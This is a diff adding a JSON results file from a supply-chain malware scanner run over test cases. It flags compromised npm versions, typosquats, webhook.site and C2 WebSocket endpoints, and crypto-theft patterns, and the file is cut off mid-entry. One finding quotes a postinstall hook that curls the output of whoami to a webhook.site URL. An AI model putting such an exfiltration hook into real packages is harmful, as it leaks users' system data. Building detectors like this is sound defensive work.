@@ -1,0 +1,1093 @@
+{
+  "scan_path": "../shai-hulud-detect/test-cases",
+  "start_time": "2025-10-03T05:32:58.219903800Z",
+  "end_time": "2025-10-03T05:32:59.178807200Z",
+  "duration_seconds": 0.958,
+  "timestamp": "2025-10-03T05:32:58.219903800Z",
+  "files_scanned": 0,
+  "results": [
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: ansi-styles@6.2.2",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: chalk@5.6.1",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: debug@4.4.2",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains crypto libraries or suspicious patterns\nNOTE: These may be legitimate crypto tools or framework code.",
+      "patterns_detected": [
+        "crypto_libraries",
+        "crypto_libraries"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains suspicious packages: Known typosquatting of '@typescript-eslint': @typescript_eslinter/eslint (missing hyphen and character change), Known typosquatting of 'lodash': lodsh (missing character (a)), Known typosquatting of 'react': reаct (cyrillic character substitution (а instead of a))",
+      "patterns_detected": [
+        "typosquatting",
+        "typosquatting",
+        "typosquatting"
+      ],
+      "details": [
+        "Known typosquatting of '@typescript-eslint': @typescript_eslinter/eslint (missing hyphen and character change)",
+        "Known typosquatting of 'lodash': lodsh (missing character (a))",
+        "Known typosquatting of 'react': reаct (cyrillic character substitution (а instead of a))"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/debug-js/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains suspicious packages: Debug package detected",
+      "patterns_detected": [
+        "debug_package_risk"
+      ],
+      "details": [
+        "Debug package detected"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: @ctrl/deluge@1.2.0",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: @nativescript-community/ui-material-core@7.2.49",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package.json",
+      "risk_level": "Low",
+      "comment": "Contains packages from affected namespaces",
+      "patterns_detected": [
+        "affected_namespace"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-crypto/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains crypto libraries or suspicious patterns\nNOTE: These may be legitimate crypto tools or framework code.",
+      "patterns_detected": [
+        "crypto_libraries",
+        "crypto_libraries",
+        "crypto_libraries"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-security-project/package.json",
+      "risk_level": "Low",
+      "comment": "Contains suspicious packages: Security project: security-scanner, Security scanning tool description",
+      "patterns_detected": [
+        "security_project",
+        "security_project"
+      ],
+      "details": [
+        "Security project: security-scanner",
+        "Security scanning tool description"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/lockfile-compromised/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: color-convert@3.1.1",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/mixed-project/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains suspicious packages: Mixed project context: mixed-project",
+      "patterns_detected": [
+        "mixed_risk_elements",
+        "affected_namespace"
+      ],
+      "details": [
+        "Mixed project context: mixed-project"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/namespace-warning/package.json",
+      "risk_level": "Low",
+      "comment": "Contains packages from affected namespaces",
+      "patterns_detected": [
+        "affected_namespace",
+        "affected_namespace"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/semver-matching/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: @ctrl/tinycolor@^4.0.0",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/semver-matching/package.json",
+      "risk_level": "High",
+      "comment": "Contains compromised package version: @operato/board@~9.0.35",
+      "patterns_detected": [
+        "compromised_package"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/typosquatting-project/package.json",
+      "risk_level": "Medium",
+      "comment": "Contains suspicious packages: Known typosquatting of '@types/node': @typеs/node (cyrillic character substitution (е instead of e)), Known typosquatting of 'express': expres (missing character (s)), Known typosquatting of 'lodash': lodsh (missing character (a)), Known typosquatting of 'react': raect (character transposition (a<->e))",
+      "patterns_detected": [
+        "typosquatting",
+        "typosquatting",
+        "typosquatting",
+        "typosquatting"
+      ],
+      "details": [
+        "Known typosquatting of '@types/node': @typеs/node (cyrillic character substitution (е instead of e))",
+        "Known typosquatting of 'express': expres (missing character (s))",
+        "Known typosquatting of 'lodash': lodsh (missing character (a))",
+        "Known typosquatting of 'react': raect (character transposition (a<->e))"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Pastebin exfiltration detected",
+      "patterns_detected": [
+        "pastebin_exfiltration"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Hardcoded private IP address detected",
+      "patterns_detected": [
+        "private_ip_hardcoded"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "C2 WebSocket connection detected",
+      "patterns_detected": [
+        "c2_websocket"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/edge-case-project/documentation.md",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/edge-case-project/documentation.md",
+      "risk_level": "Low",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/express-server.js",
+      "risk_level": "Low",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/express-server.js",
+      "risk_level": "Low",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "Medium",
+      "comment": "Potentially suspicious environment variable access",
+      "patterns_detected": [
+        "env_var_access"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious.js",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious.js",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py",
+      "risk_level": "Medium",
+      "comment": "Contains credential scanning patterns",
+      "patterns_detected": [
+        "credential_scanning"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py",
+      "risk_level": "Medium",
+      "comment": "Credential mentions detected",
+      "patterns_detected": [
+        "credential_mentions"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/mixed-project/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_alternative"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/mixed-project/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_alternative"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "High",
+      "comment": "webhook.site reference",
+      "patterns_detected": [
+        "webhook_site_reference"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "High",
+      "comment": "malicious webhook endpoint",
+      "patterns_detected": [
+        "malicious_webhook_endpoint"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Hardcoded private IP address detected",
+      "patterns_detected": [
+        "private_ip_hardcoded"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "C2 WebSocket connection detected",
+      "patterns_detected": [
+        "c2_websocket"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
+      "risk_level": "Medium",
+      "comment": "Suspicious package version in package.json: debug@4.4.2",
+      "patterns_detected": [
+        "suspicious_package_version"
+      ],
+      "details": [
+        "package.json contains debug@4.4.2, which was compromised in the September 8, 2025 attack",
+        "This may indicate workflow compromise or malicious package injection"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-lockfile-pnpm/pnpm-lock.yaml",
+      "risk_level": "Medium",
+      "comment": "pnpm lockfile contains compromised packages: @ctrl/tinycolor@4.1.2",
+      "patterns_detected": [
+        "compromised_package_in_lockfile"
+      ],
+      "details": [
+        "@ctrl/tinycolor@4.1.2"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-lockfile-pnpm/pnpm-lock.yaml",
+      "risk_level": "Medium",
+      "comment": "Recently modified lockfile contains @ctrl packages (potential worm activity)",
+      "patterns_detected": [
+        "worm_activity_detection"
+      ],
+      "details": [
+        "Lockfile contains compromised packages that may indicate worm-like behavior",
+        "Verify package versions and regenerate lockfiles if necessary"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
+      "risk_level": "Medium",
+      "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)\nNOTE: Postinstall hooks can execute arbitrary code during package installation.",
+      "patterns_detected": [
+        "suspicious_postinstall_hook"
+      ],
+      "details": [
+        "Postinstall command: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
+        "Suspicious pattern: curl",
+        "Postinstall hooks can execute arbitrary code during package installation"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
+      "risk_level": "Medium",
+      "comment": "phishing domain npmjs.help detected",
+      "patterns_detected": [
+        "npmjs_help"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
+      "risk_level": "Medium",
+      "comment": "JavaScript obfuscation detected",
+      "patterns_detected": [
+        "javascript_obfuscation"
+      ],
+      "details": [
+        "JavaScript obfuscation detected",
+        "This may indicate attempts to hide malicious code"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
+      "risk_level": "Medium",
+      "comment": "phishing domain npmjs.help detected",
+      "patterns_detected": [
+        "npmjs_help"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/http-requests.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/common-crypto-libs/package.json",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
+      "risk_level": "Medium",
+      "comment": "phishing domain npmjs.help detected",
+      "patterns_detected": [
+        "npmjs_help"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-crypto/package.json",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-legitimate/node_modules/next/dist/compiled/edge-runtime/index.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-legitimate/node_modules/react-native/Libraries/Network/XHRInterceptor.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/malicious-script.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/malicious-script.js",
+      "risk_level": "Low",
+      "comment": "ethereum wallet address patterns detected",
+      "patterns_detected": [
+        "ethereum_addresses"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/malicious-script.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/package.json",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/simple-xhr.js",
+      "risk_level": "Medium",
+      "comment": "xmlhttprequest prototype modification with crypto patterns detected - high risk",
+      "patterns_detected": [
+        "xmlhttprequest_modification"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/xmlhttp-malicious/simple-xhr.js",
+      "risk_level": "Low",
+      "comment": "cryptocurrency regex patterns detected",
+      "patterns_detected": [
+        "cryptocurrency_regex"
+      ],
+      "details": null
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Pastebin exfiltration detected",
+      "patterns_detected": [
+        "pastebin_exfiltration"
+      ],
+      "details": [
+        "Line 4: pastebin.com"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Hardcoded private IP address detected",
+      "patterns_detected": [
+        "private_ip_hardcoded"
+      ],
+      "details": [
+        "Line 13: 10.0.1.50"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: C2 WebSocket connection detected",
+      "patterns_detected": [
+        "c2_websocket"
+      ],
+      "details": [
+        "Line 10: wss://c2-server.evil.com"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Base64 decoding detected",
+      "patterns_detected": [
+        "base64_decoding"
+      ],
+      "details": [
+        "Line 16: atob("
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: WebSocket connection to external endpoint detected",
+      "patterns_detected": [
+        "suspicious_websocket"
+      ],
+      "details": [
+        "Line 10: new WebSocket(\"wss://"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Webhook.site exfiltration detected",
+      "patterns_detected": [
+        "webhook_exfiltration"
+      ],
+      "details": [
+        "Line 3: https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Hardcoded private IP address detected",
+      "patterns_detected": [
+        "private_ip_hardcoded"
+      ],
+      "details": [
+        "Line 4: 192.168.1.100"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Base64 decoding detected",
+      "patterns_detected": [
+        "base64_decoding"
+      ],
+      "details": [
+        "Line 14: atob("
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: WebSocket connection to external endpoint detected",
+      "patterns_detected": [
+        "suspicious_websocket"
+      ],
+      "details": [
+        "Line 17: new WebSocket(\"wss://"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
+      "risk_level": "Medium",
+      "comment": "Network exfiltration pattern: Webhook.site exfiltration detected",
+      "patterns_detected": [
+        "webhook_exfiltration"
+      ],
+      "details": [
+        "Line 7: https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/infected-lockfile/package-lock.json",
